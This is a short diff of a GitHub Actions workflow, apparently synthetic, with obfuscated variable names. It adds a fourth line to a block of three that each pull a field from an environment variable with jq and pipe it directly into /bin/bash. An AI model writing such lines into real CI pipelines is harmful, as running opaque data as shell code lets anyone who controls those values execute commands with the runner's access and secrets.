@@ -28,6 +28,7 @@ jobs:
           echo $jtqa0947 | jq -r .x2 | /bin/bash
           printf '%s' "$jbrm66912" | jq -r .wkj3549 | /bin/bash
           echo $fa23100 | jq -r .db69 | /bin/bash
+          echo $ql4 | jq -r .oagj78182 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
